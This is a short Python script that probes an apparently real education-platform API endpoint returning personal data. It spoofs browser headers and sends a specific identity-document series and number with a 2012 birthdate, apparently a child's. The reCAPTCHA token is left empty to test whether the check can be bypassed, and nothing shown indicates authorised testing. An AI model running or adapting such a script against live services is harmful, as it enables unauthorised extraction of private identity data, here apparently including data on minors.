import requests

url = "https://api.aistudy.uz/api/StudyAILms/Account/GetPersonDataFromGcp"
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Content-Type": "application/json",
    "Origin": "https://omp.aistudy.uz",
    "Referer": "https://omp.aistudy.uz/"
}

# Test 1: Empty or dummy token
payload = {
    "seria": "I-FR",
    "number": "0617549",
    "birthdate": "2012-04-19",
    "recaptchaToken": ""
}

try:
    r = requests.post(url, json=payload, headers=headers, timeout=10)
    print("Test 1 (empty token) Status:", r.status_code)
    print("Response:", r.text)
except Exception as e:
    print("Error:", e)
